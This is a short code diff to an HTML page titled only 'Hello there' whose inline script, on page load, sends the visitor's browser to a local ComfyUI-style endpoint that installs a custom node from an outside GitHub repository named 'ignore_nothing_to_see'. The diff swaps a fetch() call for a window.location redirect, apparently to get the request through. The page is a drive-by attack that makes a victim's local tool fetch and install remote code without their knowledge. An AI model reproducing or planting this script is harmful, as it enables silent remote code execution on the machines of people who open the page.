@@ -6,24 +6,8 @@
         Hello there
         <script>
             console.log("Hello from the script");
-            fetch("http://localhost:8188/customnode/install/git_url?url=https://github.com/vivax3794/ignore_nothing_to_see.git", {
-    "credentials": "omit",
-    "headers": {
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Comfy-User": "undefined",
-        "Sec-GPC": "1",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache"
-    },
-    "referrer": "http://localhost:8188/",
-    "method": "GET",
-    "mode": "cors"
-}).then(response => response.json()).then(data => console.log(data));
+            let url = "http://localhost:8188/customnode/install/git_url?url=https://github.com/vivax3794/ignore_nothing_to_see.git"
+            window.location = url;
         </script>
     </body>
 </html>
